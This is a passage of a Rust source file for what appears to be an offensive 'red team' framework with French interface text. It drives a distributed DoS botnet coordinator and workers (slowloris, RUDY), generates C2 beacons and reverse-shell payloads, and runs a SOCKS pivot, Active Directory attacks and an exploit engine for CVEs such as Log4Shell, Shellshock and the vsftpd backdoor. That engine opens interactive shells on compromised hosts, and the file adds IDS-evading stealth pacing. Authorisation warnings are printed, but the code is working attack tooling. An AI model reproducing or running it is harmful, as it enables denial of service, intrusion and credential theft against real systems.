        let custom_paths = cli.dos_browser_paths.clone().filter(|v| !v.is_empty());
        let tmpl = GoldenEyeConfig {
            url: if cli.dos_goldeneye.is_some() {
                cli.dos_goldeneye.clone().unwrap_or_default()
            } else {
                String::new()
            },
            workers: cli.dos_workers,
            sockets_per_worker: cli.dos_sockets_per_worker,
            method,
            verify_ssl: !cli.dos_nosslcheck,
            duration_secs: cli.dos_duration.or(cli.horde_duration),
            connect_timeout_ms: cli.dos_connect_timeout,
            read_timeout_ms: cli.dos_read_timeout,
            user_agents: uas,
            debug: cli.dos_debug,
            attack_mode: attack,
            num_bots: cli.dos_bots.max(cli.horde_total_bots),
            max_concurrent_bots: cli.dos_bots_concurrent,
            rotate_fingerprint_on_403: !cli.dos_no_rotate_fingerprint,
            send_client_hints: !cli.dos_no_client_hints,
            send_sec_fetch: !cli.dos_no_sec_fetch,
            send_priority_header: !cli.dos_no_priority,
            use_early_data: cli.dos_early_data,
            slowloris_header_period_ms: cli.dos_slowloris_period,
            rudy_chunk_size: cli.dos_rudy_chunk,
            rudy_chunk_delay_ms: cli.dos_rudy_delay,
            browser_paths: custom_paths.unwrap_or_default(),
            bot_id_offset: 0,
        };
        println!();
        println!("  {INV_MATRIX} [ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES ] {RESET}");
        println!(
            "  {GRIS}ⓘ  Workers se connectent via: nrtg --horde-worker ws://{addr}:{port}{RESET}",
            addr = &bind_addr,
            port = cli.horde_port
        );
        println!();
        let adapt_auto = cli.horde_adapt.to_ascii_lowercase() == "auto";
        return crate::horde::coordinator::run_horde_coordinator(
            master_key,
            bind_addr,
            cli.horde_port,
            adapt_auto,
            cli.horde_total_bots,
            cli.horde_duration,
            tmpl,
            cli.output.clone(),
        )
        .await
        .map_err(|e| anyhow!("{}", e));
    }

    // ── --horde-worker : worker HORDE distribué ─────────────────────────────
    if let Some(ref coord_url) = cli.horde_worker.clone() {
        use crate::stress::goldeneye::{
            parse_user_agents_file, AttackMode, DosMethod, GoldenEyeConfig,
        };
        use ansi::*;
        splash_header();
        rule("HORDE WORKER — Noeud de Frappe Volumétrique", AMBER);
        println!(
            "  {AMBER}[→]{RESET} Coordinator: {CYAN}{}{RESET}",
            coord_url
        );
        let caps = crate::horde::WorkerCapabilities::default();
        println!(
            "  {AMBER}[→]{RESET} CPU cores:   {GRIS}{}{RESET}",
            caps.cpu_cores
        );
        println!(
            "  {AMBER}[→]{RESET} Bot capacity:{GRIS}{}{RESET}",
            caps.estimated_bot_capacity
        );
        println!(
            "  {AMBER}[→]{RESET} Est. BW:     {GRIS}{} Mbps{RESET}",
            caps.estimated_bw_mbps
        );
        let method = DosMethod::from_str(&cli.dos_method)
            .ok_or_else(|| anyhow!("--dos-method invalide '{}'", cli.dos_method))?;
        let attack = AttackMode::from_str(&cli.dos_mode)
            .ok_or_else(|| anyhow!("--dos-mode invalide '{}'", cli.dos_mode))?;
        let uas = if let Some(ref p) = cli.dos_useragents {
            match parse_user_agents_file(p) {
                Ok(v) if !v.is_empty() => Some(v),
                _ => None,
            }
        } else {
            None
        };
        let custom_paths = cli.dos_browser_paths.clone().filter(|v| !v.is_empty());
        let tmpl = GoldenEyeConfig {
            url: if cli.dos_goldeneye.is_some() {
                cli.dos_goldeneye.clone().unwrap_or_default()
            } else {
                String::new()
            },
            workers: cli.dos_workers,
            sockets_per_worker: cli.dos_sockets_per_worker,
            method,
            verify_ssl: !cli.dos_nosslcheck,
            duration_secs: cli.dos_duration.or(cli.horde_duration),
            connect_timeout_ms: cli.dos_connect_timeout,
            read_timeout_ms: cli.dos_read_timeout,
            user_agents: uas,
            debug: cli.dos_debug,
            attack_mode: attack,
            num_bots: cli.dos_bots.max(cli.horde_total_bots),
            max_concurrent_bots: cli.dos_bots_concurrent,
            rotate_fingerprint_on_403: !cli.dos_no_rotate_fingerprint,
            send_client_hints: !cli.dos_no_client_hints,
            send_sec_fetch: !cli.dos_no_sec_fetch,
            send_priority_header: !cli.dos_no_priority,
            use_early_data: cli.dos_early_data,
            slowloris_header_period_ms: cli.dos_slowloris_period,
            rudy_chunk_size: cli.dos_rudy_chunk,
            rudy_chunk_delay_ms: cli.dos_rudy_delay,
            browser_paths: custom_paths.unwrap_or_default(),
            bot_id_offset: 0,
        };
        println!();
        println!("  {INV_MATRIX} [ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES ] {RESET}");
        println!();
        return crate::horde::worker::run_horde_worker(
            coord_url.to_string(),
            cli.horde_key.as_deref(),
            tmpl,
        )
        .await
        .map_err(|e| anyhow!("{}", e));
    }

    // ── --ws-beacon : générer les payloads beacon WS ─────────────────────────
    if let Some(ref target) = cli.ws_beacon {
        use crate::c2::ws_c2::generate_ws_beacon;
        use ansi::*;
        let fire2 = "\x1b[38;5;196m";
        let parts: Vec<&str> = target.rsplitn(2, ':').collect();
        let (host, port) = if parts.len() == 2 {
            (parts[1], parts[0].parse::<u16>().unwrap_or(8444))
        } else {
            (target.as_str(), 8444u16)
        };
        println!("\n  {BOLD}{fire2}▍ WS BEACON PAYLOADS{RESET}  C2={host}:{port}\n");
        for (lang, payload) in generate_ws_beacon(host, port, 60) {
            println!("  {CYAN}[{lang}]{RESET}");
            println!(
                "{DIM}{}{RESET}\n",
                &payload.chars().take(600).collect::<String>()
            );
        }
        return Ok(());
    }

    // ── --socks-proxy : proxy SOCKS5 ─────────────────────────────────────────
    if cli.socks_proxy {
        return crate::pivot::start_socks5_proxy(cli.socks_port)
            .await
            .map_err(|e| anyhow::anyhow!(e.to_string()));
    }

    // ── --osint : reconnaissance passive ─────────────────────────────────────
    // (--osint handled above with v2)

    // ── --payload : générer un payload reverse shell ──────────────────────────
    if cli.payload {
        use crate::shell::generate_payload;
        println!(
            "\n  \x1b[38;5;196m[PAYLOAD]\x1b[0m Reverse shell — lhost={} lport={}\n",
            cli.lhost, cli.lport
        );
        for os in &["linux", "windows"] {
            let payload = generate_payload(&cli.lhost, cli.lport, &cli.payload_type, os);
            println!("  \x1b[36m[{}]\x1b[0m {}", os.to_uppercase(), payload);
        }
        println!();
        return Ok(());
    }

    // ── --dc-ip : Active Directory attacks ────────────────────────────────────
    if let Some(ref dc) = cli.dc_ip {
        use crate::ad::{bloodhound_collection_cmds, ldap_anonymous_bind, print_ad_report};
        let domain = cli.ad_domain.as_deref().unwrap_or("corp.local");
        println!(
            "\n  \x1b[36m[AD]\x1b[0m Attaque Active Directory → DC={} Domain={}",
            dc, domain
        );
        let mut report = ldap_anonymous_bind(dc, domain, 389)
            .await
            .unwrap_or_default();
        report.dc_ip = dc.clone();
        report.domain = domain.to_string();
        print_ad_report(&report);
        if cli.ad_user.is_some() {
            let user = cli.ad_user.as_deref().unwrap_or("");
            let pass = cli.ad_pass.as_deref().unwrap_or("");
            println!("\n  \x1b[36m[AD]\x1b[0m Commandes de collecte BloodHound :");
            for cmd in bloodhound_collection_cmds(dc, domain, user, pass) {
                println!("  \x1b[90m  {}\x1b[0m", cmd);
            }
        }
        return Ok(());
    }

    // ── ⚠️ OPSEC WARNING RED TEAM ────────────────────────────────────────────
    //    Affiche un avertissement unique dès qu'un module d'exploitation est invoqué.
    macro_rules! opsec_warning {
        ($mod:expr) => {{
            use ansi::*;
            let fire = "\x1b[38;5;196m";
            eprintln!("\n  {fire}▌ ATTENTION OPÉRATIONNELLE — {mod} ▐{RESET}", mod=$mod);
            eprintln!("  {AMBER}  Ce module exécute du code d'exploitation réel (shell/RCE/credential harvest).{RESET}");
            eprintln!("  {AMBER}  Usage STRICTEMENT réservé aux infrastructures disposant :{RESET}");
            eprintln!("  {GRIS}   · D'un contrat écrit signé client / autorisation écrite.{RESET}");
            eprintln!("  {GRIS}   · D'une dérogation ISO 27001 / périmètre de test formellement notifié.{RESET}");
            eprintln!("  {GRIS}   · Du respect des articles 323-1 à 323-7 CP (FR) ou 18 U.S.C. §1030 (US).{RESET}");
            eprintln!("  {AMBER}  Le Red Teamer assume la pleine responsabilité juridique de son exécution.{RESET}\n");
        }};
    }

    // ── --list-exploits : tableau des modules RCE/SHELL disponibles ─────────
    if cli.list_exploits {
        opsec_warning!("LISTE MODULES EXPLOITS");
        use ansi::*;
        println!("  {BOLD}{RED}▍ MODULES D'EXPLOITATION DISPONIBLES (exploit_engine.rs){RESET}");
        println!("  {GRIS}{}{RESET}", "─".repeat(78));
        println!("  {CYN}{:<22}{RESET} {GRIS}|{RESET} {ORG}{:<14}{RESET} {GRIS}|{RESET} {YLW}{:<28}{RESET} {GRIS}|{RESET} {}",
                 "ID", "IMPACT", "CVE / RÉFÉRENCE", "DESCRIPTION");
        println!("  {GRIS}{}{RESET}", "─".repeat(78));
        let rows = [
            (
                "vsftpd_234_backdoor",
                "SHELL",
                "CVE-2011-2523",
                "Backdoor USER x:) → port 6200 root shell TCP",
            ),
            (
                "proftpd_133c_overflow",
                "SHELL",
                "CVE-2010-4221",
                "Buffer overflow ProFTPD 1.3.3c + reverse shell",
            ),
            (
                "apache_mod_cgi",
                "RCE",
                "CVE-2014-6271/Shellshock",
                "User-Agent `() { :; };` RCE HTTP/1.0 CGI",
            ),
            (
                "log4shell",
                "RCE",
                "CVE-2021-44228",
                "JNDI LDAP lookup Log4j ≥1.2-Beta9",
            ),
            (
                "spring4shell",
                "RCE",
                "CVE-2022-22965",
                "Spring Core Tomcat WAR classloader RCE",
            ),
            (
                "ms17_010_eternalblue",
                "CHECK",
                "MS17-010 (CVE-2017-0144)",
                "Détection SMBv1 EternalBlue (no exploit)",
            ),
            (
                "heartbleed",
                "CREDS",
                "CVE-2014-0160",
                "TLS heartbeat heap dump 64KB mémoire serveur",
            ),
        ];
        for (id, impact, cve, desc) in rows {
            let col = match impact {
                "SHELL" => RED,
                "RCE" => "\x1b[38;5;199m",
                "CREDS" => ORG,
                _ => YLW,
            };
            println!("  {col}{:<22}{RESET} {GRIS}|{RESET} {col}{:<14}{RESET} {GRIS}|{RESET} {YLW}{:<28}{RESET} {GRIS}|{RESET} {}",
                     id, impact, cve, desc);
        }
        println!("  {GRIS}{}{RESET}", "─".repeat(78));
        println!("  Usage : {CYN}--exploit <ID> --exploit-target HOST:PORT --exploit-cmd 'id;whoami'{RESET}");
        println!("          Options : --lhost/--lport → reverse shell · --exploit-arch x64 · --exploit-os linux\n");
        return Ok(());
    }

    // ── --exploit : exécution module RCE/SHELL + enregistrement session ─────
    if let Some(ref exploit_id) = cli.exploit {
        opsec_warning!("EXPLOIT ENGINE ACTIF");
        use crate::exploit_engine::{self, ExploitResult, PayloadType};
        use crate::shell::{ShellType, GLOBAL_SESSIONS};
        use ansi::*;

        let target = cli
            .exploit_target
            .as_ref()
            .ok_or_else(|| anyhow!("--exploit nécessite --exploit-target <HOST:PORT>"))?;

        // Parser host:port
        let (host, port) = match target.rsplit_once(':') {
            Some((h, p)) => (
                h.trim_start_matches('[').trim_end_matches(']'),
                p.parse::<u16>()
                    .map_err(|e| anyhow!("--exploit-target port invalide : {}", e))?,
            ),
            None => return Err(anyhow!("--exploit-target attendu HOST:PORT")),
        };

        println!("  {BOLD}{RED}▍ EXPLOITATION{RESET}  module={RED}{exploit_id}{RESET} → {CYAN}{host}:{port}{RESET}");
        println!("  {GRIS}cmd post-shell : {}{RESET}", cli.exploit_cmd);
        if cli.listen {
            println!(
                "  {GRIS}listener reverse TCP: {}{}:{}{RESET}",
                "\x1b[38;5;208m", cli.lhost, cli.lport
            );
        }

        let mut opts: std::collections::HashMap<String, String> = std::collections::HashMap::new();
        opts.insert("cmd".into(), cli.exploit_cmd.clone());
        opts.insert("lhost".into(), cli.lhost.clone());
        opts.insert("lport".into(), cli.lport.to_string());
        if let Some(a) = cli.exploit_arch.clone() {
            opts.insert("arch".into(), a);
        }
        if let Some(o) = cli.exploit_os.clone() {
            opts.insert("platform".into(), o);
        }

        let result: ExploitResult =
            exploit_engine::exploit_buffer_overflow(host, port, exploit_id, &opts).await;

        match result {
            ExploitResult::Success {
                session_id: _,
                shell_type,
                user,
                system_info,
                proof,
            } => {
                println!("\n  {GRN}{BOLD}[+] EXPLOIT RÉUSSI{RESET}");
                println!("    user       = {RED}{}{RESET}", user);
                println!("    shell      = {CYAN}{}{RESET}", shell_type);
                println!("    system     = {GRIS}{}{RESET}", system_info);
                if !proof.trim().is_empty() {
                    println!(
                        "    preuve cmd = \n{GRIS}{}{RESET}",
                        proof
                            .lines()
                            .map(|l| format!("       {l}"))
                            .collect::<Vec<_>>()
                            .join("\n")
                    );
                }

                // ── Enregistrement shell bind/backdoor en session interactive ──
                //    Si l'exploit a ouvert un shell TCP direct (vsftpd 6200…),
                //    on le ré-ouvre dans le GLOBAL_SESSIONS pour --interact / --session-cmd
                let shell_sid = match exploit_id.as_str() {
                    "vsftpd_234_backdoor" => {
                        let backdoor_port = 6200u16;
                        match tokio::time::timeout(
                            std::time::Duration::from_secs(4),
                            tokio::net::TcpStream::connect(format!("{}:{}", host, backdoor_port)),
                        )
                        .await
                        {
                            Ok(Ok(stream)) => Some(
                                GLOBAL_SESSIONS
                                    .register_external_session(
                                        stream,
                                        host.to_string(),
                                        backdoor_port,
                                        ShellType::BindTcp,
                                        Some(user.clone()),
                                        system_info
                                            .split_whitespace()
                                            .next()
                                            .map(|s| s.to_string()),
                                        None,
                                    )
                                    .await,
                            ),
                            _ => None,
                        }
                    }
                    _ => None,
                };

                if let Some(sid) = shell_sid {
                    println!("\n  {GRN}[SESSION {sid}] Shell interactif ENREGISTRÉ{RESET}");
                    println!("    interactif : {CYN}--interact {sid}{RESET}");
                    println!("    cmd unique : {CYN}--interact {sid} --session-cmd 'cat /etc/passwd'{RESET}");
                }

                // Génération payload reverse shell recommandé pour étendre la persistance
                use crate::shell::generate_payload;
                let os_guess = cli.exploit_os.as_deref().unwrap_or("linux");
                let plat = match os_guess {
                    "win" | "windows" => "windows",
                    _ => "linux",
                };
                let ptype = if plat == "linux" {
                    "bash"
                } else {
                    "powershell"
                };
                println!("\n  {GRIS}Payload reverseshell recommandé{RESET} (OS={plat}) :");
                println!(
                    "    {}{RESET}",
                    generate_payload(&cli.lhost, cli.lport, ptype, plat)
                );
            }
            ExploitResult::Partial {
                message,
                info_gathered,
            } => {
                println!("\n  {AMBER}[?] PARTIEL{RESET} {}", message);
                if !info_gathered.is_empty() {
                    println!("  {GRIS}info collectée : {}{RESET}", info_gathered);
                }
            }
            ExploitResult::Skipped { reason } => {
                println!("\n  {GRIS}[-] SKIP{RESET} : {}", reason);
            }
            ExploitResult::Failed { reason, error } => {
                println!("\n  {RED}[✗] ÉCHEC{RESET}  raison = {}", reason);
                if !error.trim().is_empty() {
                    println!("  {GRIS}détail technique : {}{RESET}", error);
                }
                std::process::exit(2);
            }
        }
        return Ok(());
    }

    // ── --session-cmd + --interact : exécution unique commande sur session ───
    if let (Some(sid), Some(cmd)) = (cli.interact, cli.session_cmd.as_ref()) {
        use crate::shell::{ShellSession, GLOBAL_SESSIONS};
        use ansi::*;
        println!("  {BOLD}{RED}▍ SESSION-CMD{RESET} session={sid} → {GRN}{cmd}{RESET}");
        match GLOBAL_SESSIONS.exec(sid, cmd, 10).await {
            Ok(out) if !out.trim().is_empty() => {
                println!(
                    "\n  {GRIS}sortie :{RESET}\n{}{RESET}",
                    out.lines()
                        .map(|l| format!("    {l}"))
                        .collect::<Vec<_>>()
                        .join("\n")
                );
            }
            Ok(_) => {
                println!("  {GRIS}sortie : (vide — commande peut-être asynchrone){RESET}");
            }
            Err(e) => {
                println!("  {RED}ERREUR{RESET} : {e}");
                println!("  {GRIS}Astuce : le listener --listen doit être actif et avoir reçu la connexion reverse shell ;\n         ou --exploit vsftpd_234_backdoor doit avoir été joué sur la même invocation.{RESET}");
                std::process::exit(3);
            }
        }
        return Ok(());
    }

    // ── --sessions : liste des sessions shell actives dans GLOBAL_SESSIONS ────
    if cli.sessions {
        use crate::shell::{SessionStatus, GLOBAL_SESSIONS};
        use ansi::*;
        opsec_warning!("SESSIONS ACTIVES");
        let sessions = GLOBAL_SESSIONS.list().await;
        println!(
            "  {BOLD}{RED}▍ SESSIONS SHELL ENREGISTRÉES{RESET}  total={GRN}{}{RESET}",
            sessions.len()
        );
        println!("  {GRIS}{}{RESET}", "─".repeat(84));
        println!("  {CYN}{:<5}{RESET} {GRIS}|{RESET} {CYN}{:<21}{RESET} {GRIS}|{RESET} {YLW}{:<10}{RESET} {GRIS}|{RESET} {ORG}{:<12}{RESET} {GRIS}|{RESET} {GRN}{:<8}{RESET} {GRIS}|{RESET} {}",
                 "ID", "REMOTE", "SHELL", "STATUT", "DERNIER", "OS / USER");
        println!("  {GRIS}{}{RESET}", "─".repeat(84));
        for s in &sessions {
            let c_stat = match s.status {
                SessionStatus::Active => GRN,
                SessionStatus::Sleeping => YLW,
                SessionStatus::Dead => RED,
            };
            println!("  {GRN}{:<5}{RESET} {GRIS}|{RESET} {:<21} {GRIS}|{RESET} {YLW}{:<10}{RESET} {GRIS}|{RESET} {c_stat}{:<12}{RESET} {GRIS}|{RESET} {:<8} {GRIS}|{RESET} {} @ {}",
                     s.id,
                     format!("{}:{}", s.remote_ip, s.remote_port),
                     s.shell_type,
                     s.status,
                     s.last_seen.get(11..19).unwrap_or("—"),
                     s.username.as_deref().unwrap_or("?"),
                     s.os.as_deref().unwrap_or("?"),
            );
        }
        if sessions.is_empty() {
            println!("  {GRIS}(aucune session active — lancez {CYN}--listen{GRIS} en parallèle puis déclenchez un reverse shell,\n   ou utilisez {CYN}--exploit vsftpd_234_backdoor{GRIS} sur une cible vulnérable){RESET}");
        }
        println!();
        return Ok(());
    }

    // ── --interact <id> : shell interactif (stdin/stdout relayé par GLOBAL_SESSIONS)
    if let Some(sid) = cli.interact {
        use crate::shell::{interactive_shell, ShellSession, GLOBAL_SESSIONS};
        use ansi::*;
        match GLOBAL_SESSIONS.get(sid).await {
            None => {
                eprintln!("  {RED}Session {sid} inconnue{RESET} — utilisez {CYN}--sessions{RESET} pour lister.");
                std::process::exit(4);
            }
            Some(_s) => {
                opsec_warning!(format!("INTERACTIF SESSION {sid}"));
                println!("  {GRN}[SESSION {sid}]{RESET} Mode interactif — tapez {YLW}exit{RESET} pour quitter");
                if let Err(e) = interactive_shell(sid, GLOBAL_SESSIONS.clone()).await {
                    eprintln!("  {RED}session close : {e}{RESET}");
                }
            }
        }
        return Ok(());
    }

    // --- Parse CLI + load config BEFORE logging init so we know log format ---
    let http_t = clamp_timeout(cli.http_timeout, cli.min_timeout, cli.max_timeout);
    let tcp_t = clamp_timeout(cli.tcp_timeout, cli.min_timeout, cli.max_timeout);
    let (targets, risk_rules, cve_db, captured_links, export_csv, export_md, cap_cfg, runtime) =
        load_config_effective(&cli);

    // --- Initialize professional structured logging ---
    if let Err(e) = logging::init_logging(&runtime.logging) {
        eprintln!("⚠️  Logging init failed: {} — falling back to stderr", e);
    }

    // ---------- MISSION BRIEF CYBERPUNK ----------
    use ansi::*;
    let v = env!("CARGO_PKG_VERSION");
    let fire2 = "\x1b[38;5;196m";
    let fire3 = "\x1b[38;5;214m";
    println!("\n  {BOLD}{fire2}[ D I A P I L E ]{RESET}  {fire3}Red Team Framework v{v}{RESET}");
    println!("  {GRIS}{}{RESET}\n", "=".repeat(60));

    println!("  {GRIS}[ MISSION STARTED ]{RESET} {AMBER}{}{RESET}  {GRIS}|{RESET}  {GRIS}[TZ]{RESET} {CYAN}{}{RESET}",
        Local::now().format("%Y-%m-%d %H:%M:%S"),
        chrono::Local::now().offset().to_string()
    );

    let mut brief_items: Vec<(String, String)> = Vec::new();
    brief_items.push((
        "TARGETS".to_string(),
        format!("{MATRIX}{n}{RESET}", n = targets.len()),
    ));
    brief_items.push((
        "TIMEOUTS".to_string(),
        format!(
            "HTTP={CYAN}{ht}{RESET}s TCP={CYAN}{tt}{RESET}s",
            ht = http_t,
            tt = tcp_t
        ),
    ));
    let mut exports: Vec<&str> = Vec::new();
    if export_csv {
        exports.push("CSV");
    }
    if export_md {
        exports.push("MD");
    }
    if runtime.do_api_report {
        exports.push("API+HTML");
    }
    brief_items.push((
        "EXPORTS".to_string(),
        if exports.is_empty() {
            format!("{GRIS}JSON only{RESET}")
        } else {
            format!("{AMBER}{}{RESET}", exports.join(" · "))
        },
    ));

    let exploit_state = if runtime.pentest.dry_run {
        format!("{MATRIX}SAFE DRY-RUN{RESET} {GRIS}(no probes){RESET}")
    } else {
        format!("{RED}⚠ ACTIVE{RESET} {GRIS}(live probes){RESET}")
    };
    let depth = match runtime.pentest.exploit_depth {
        exploits::ExploitDepth::Light => "LIGHT",
        exploits::ExploitDepth::Medium => "MEDIUM",
        exploits::ExploitDepth::Deep => "DEEP",
    };
    let impact = match runtime.pentest.max_exploit_impact {
        exploits::ImpactLevel::Informational => "INFO",
        exploits::ImpactLevel::CredHarvest => "CRED",
        exploits::ImpactLevel::Shell => "SHELL",
        exploits::ImpactLevel::Rce => "RCE",
    };
    brief_items.push(("EXPLOITS".to_string(), format!("{exploit_state}  {GRIS}depth={RESET}{VIOLET}{depth}{RESET}  {GRIS}max_impact={RESET}{RED}{impact}{RESET}")));

    if let Some(llm) = &runtime.llm {
        let provider = match llm.provider {
            LlmProvider::OpenAi => "OpenAI",
            LlmProvider::OpenRouter => "OpenRouter",
            LlmProvider::Ollama => "Ollama",
        };
        brief_items.push((
            "AI".to_string(),
            format!(
                "{VIOLET}{provider}{RESET} · model={CYAN}{m}{RESET} · topN={VIOLET}{n}{RESET}",
                m = llm.model,
                n = runtime.ai_targets
            ),
        ));
    } else if runtime.do_ai {
        brief_items.push((
            "AI".to_string(),
            format!("{RED}⚠ KEY MISSING{RESET} {GRIS}(--ai-report ignored → no enrichment){RESET}"),
        ));
    }

    if cap_cfg.iface.is_some() || captured_links.is_some() {
        let mut parts = Vec::new();
        if let Some(i) = cap_cfg.iface.as_ref() {
            parts.push(format!(
                "{AMBER}live-capture{RESET}@{CYAN}{i}{RESET} {GRIS}{t}s{RESET}",
                t = cap_cfg.duration
            ));
        }
        if captured_links.is_some() {
            parts.push(format!("{AMBER}flows-json{RESET} loaded"));
        }
        brief_items.push(("TOPOLOGY".to_string(), parts.join(" + ")));
    }

    let cve_count = cve_db.len();
    let rule_count = risk_rules.version_bumps.len();
    brief_items.push((
        "DATABASES".to_string(),
        format!(
            "CVEs={CYAN}{c}{RESET} rules={CYAN}{r}{RESET}",
            c = cve_count,
            r = rule_count
        ),
    ));

    // Affichage en colonnes
    println!();
    for (k, v) in &brief_items {
        println!("  {GRIS}{:>16}{RESET}  {DIM}▐{RESET}  {}", k, v);
    }
    println!();

    if !targets.is_empty() {
        println!("  {MATRIX}{BOLD}▍ CIBLE(S){RESET}");
        for t in &targets {
            println!("    {GRIS}•{RESET} {}", t);
        }
    }

    scan_info!(
        version = env!("CARGO_PKG_VERSION"),
        targets = targets.len(),
        "run start"
    );

    if targets.is_empty() && cap_cfg.iface.is_none() {
        return Err(anyhow!("No targets to scan. Use --targets, provide a config file, or use --capture-iface for flow-only mode."));
    }

    let target_ports: HashSet<u16> = targets
        .iter()
        .filter_map(|t| parse_target(t).ok())
        .map(|(_, _, _, p, _)| p)
        .collect();

    // -----------------------------------------------------------
    // 0b. LIVE DASHBOARD (OPSEC: bind 127.0.0.1:<port> SEULEMENT)
    // -----------------------------------------------------------
    use crate::live_dashboard::{eta_smoothed, DashboardEvent, LiveHub};
    let mut dashboard_hub_guard: Option<(
        crate::live_dashboard::DashboardEmitter,
        tokio::task::JoinHandle<()>,
        std::sync::Arc<tokio::sync::Notify>,
    )> = None;
    let mut emit: Option<crate::live_dashboard::DashboardEmitter> = None;
    if cli.dashboard_live {
        use crate::live_dashboard::open_browser;
        match LiveHub::bind(cli.dashboard_port).await {
            Ok(hub) => {
                let port = hub.bind_port();
                let emitter = hub.emitter();
                let stop = std::sync::Arc::new(tokio::sync::Notify::new());
                let stop_c = stop.clone();
                let server_handle = tokio::spawn(async move {
                    tokio::select! {
                        _ = hub.serve() => {},
                        _ = stop_c.notified() => {},
                    }
                });
                let url = format!("http://127.0.0.1:{port}/");
                emit = Some(emitter.clone());
                dashboard_hub_guard = Some((emitter, server_handle, stop));
                use ansi::*;
                println!();
                println!("  {MATRIX}{BOLD}▍ LIVE DASHBOARD{RESET}  {GRIS}Web+WS bindés exclusivement sur 127.0.0.1:{}{RESET}", port);
                println!("    {GRIS}→ URL auto-servie :{RESET}");
                println!("    {CYAN}●{RESET}  {url}   {GRIS}(dashboard + WS auto-connecté){RESET}");
                if !cli.no_dashboard_auto_open {
                    match open_browser(&url) {
                        Ok(()) => println!("    {MATRIX}✓{RESET}  {BOLD}Navigateur ouvert automatiquement{RESET}"),
                        Err(_) => println!("    {AMBER}ℹ{RESET}  {GRIS}Ouverture auto impossible — ouvrir le lien ci-dessus manuellement{RESET}"),
                    }
                } else {
                    println!("    {GRIS}ℹ  --no-dashboard-auto-open : ouvrir le lien manuellement{RESET}");
                }
                println!(
                    "    {AMBER}⚠{RESET}  {GRIS}Jamais forwarder ce port — OPSEC critique.{RESET}"
                );
                println!();
            }
            Err(e) => {
                eprintln!("  ⚠  Impossible de démarrer le dashboard live: {}", e);
                eprintln!("     → Scan continue en mode classique (sorties fichier normales).");
            }
        }
    }

    // -----------------------------------------------------------
    // 1. Live capture (optional)
    // -----------------------------------------------------------
    // Spawn capture in a background OS thread so it runs CONCURRENTLY with the scan
    // (joining it BEFORE the scan meant 30s of silence → 0 packets captured).
    // A stop signal lets the capture terminate early once the scan is done.
    let cap_stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let cap_handle: Option<std::thread::JoinHandle<anyhow::Result<crate::capture::CaptureResult>>> =
        if let Some(iface) = cap_cfg.iface.as_ref() {
            println!(
                "\n📶 Live capture on {} for {}s (max {} flows)...",
                iface, cap_cfg.duration, cap_cfg.max_flows
            );
            if cap_cfg.capture_all {
                println!("   ⚠  --capture-all : NO port filter (full traffic capture)");
            } else if !target_ports.is_empty() {
                println!(
                    "   Filter focused on {} port(s) from targets",
                    target_ports.len()
                );
            }
            if cap_cfg.promiscuous {
                println!("   👁  Promiscuous mode ENABLED");
            }
            if let Some(bpf) = &cap_cfg.bpf_filter {
                println!("   🧲 BPF filter: {}", bpf);
            }
            let duration = cap_cfg.duration;
            let iface_c = iface.clone();
            let max_f = cap_cfg.max_flows;
            // --capture-all disables the port filter; otherwise filter by target ports (if any).
            let ports_filter: Option<HashSet<u16>> = if cap_cfg.capture_all {
                None
            } else if target_ports.is_empty() {
                None
            } else {
                Some(target_ports.clone())
            };
            let promisc = cap_cfg.promiscuous;
            let bpf = cap_cfg.bpf_filter.clone();
            let stop_c = cap_stop.clone();
            Some(std::thread::spawn(move || {
                run_capture(
                    Some(&iface_c),
                    duration,
                    ports_filter.as_ref(),
                    max_f,
                    Some(stop_c),
                    promisc,
                    bpf.as_deref(),
                )
            }))
        } else {
            None
        };
    // Capture output path & output flag captured here for post-scan join.
    let cap_output_path = cap_cfg.output.clone();
    let cap_iface_for_log = cap_cfg.iface.clone();

    // -----------------------------------------------------------
    // 2. Parallel scan of all targets (buffer_unordered + STEALTH pacing)
    // -----------------------------------------------------------
    let mut nodes: Vec<GraphNode> = Vec::new();
    let mut summaries: Vec<ScanTargetSummary> = Vec::new();
    let mut node_extras: HashMap<String, NodeExtra> = HashMap::new();
    let start_scan_unix_ms = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let progress_counter = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let reachable_counter = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let cve_counter_accum = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));

    // Tâche annexe: Progress ticker 100ms (EMA smoothed) si dashboard live
    let mut _progress_ticker_handle: Option<tokio::task::JoinHandle<()>> = None;
    if let Some(dash_em) = emit.as_ref() {
        let total_guess = targets.len().max(1);
        let emit_c = dash_em.clone();
        let pc = progress_counter.clone();
        let rc = reachable_counter.clone();
        let cc = cve_counter_accum.clone();
        let start_ts = start_scan_unix_ms;
        _progress_ticker_handle = Some(tokio::spawn(async move {
            let mut eta_cache: Option<f32> = None;
            let mut interval = tokio::time::interval(std::time::Duration::from_millis(100));
            let mut tick: u64 = 0;
            loop {
                interval.tick().await;
                tick = tick.wrapping_add(1);
                let done = pc.load(std::sync::atomic::Ordering::Relaxed);
                let reach = rc.load(std::sync::atomic::Ordering::Relaxed);
                let ncves = cc.load(std::sync::atomic::Ordering::Relaxed);
                let eta = eta_smoothed(eta_cache, done, total_guess, start_ts);
                eta_cache = Some(eta);
                emit_c
                    .send(DashboardEvent::Progress {
                        total: total_guess,
                        done,
                        eta_seconds: eta,
                        reachable: reach,
                        total_cves: ncves,
                    })
                    .await;
                if done >= total_guess {
                    break;
                }
                if tick > 3_600_000 {
                    break;
                } // safety 100h
            }
            let done = pc.load(std::sync::atomic::Ordering::Relaxed);
            let reach = rc.load(std::sync::atomic::Ordering::Relaxed);
            let ncves = cc.load(std::sync::atomic::Ordering::Relaxed);
            emit_c
                .send(DashboardEvent::Progress {
                    total: total_guess,
                    done,
                    eta_seconds: 0.0,
                    reachable: reach,
                    total_cves: ncves,
                })
                .await;
        }));
    }

    if !targets.is_empty() {
        use futures::StreamExt;
        // ── QW1: Stealth pacing tiers (OPSEC anti-IDS) ────────────
        let stealth_cfg = StealthCfg::from_str(&cli.stealth);
        let concurrency = cli.parallel.max(1).min(64).min(stealth_cfg.max_concurrency);
        println!(
            "\n📡 Scanning {} target{} (concurrency={}, stealth={}, jitter={}..{}ms)",
            targets.len(),
            if targets.len() == 1 { "" } else { "s" },
            concurrency,
            cli.stealth,
            stealth_cfg.jitter_min_ms,
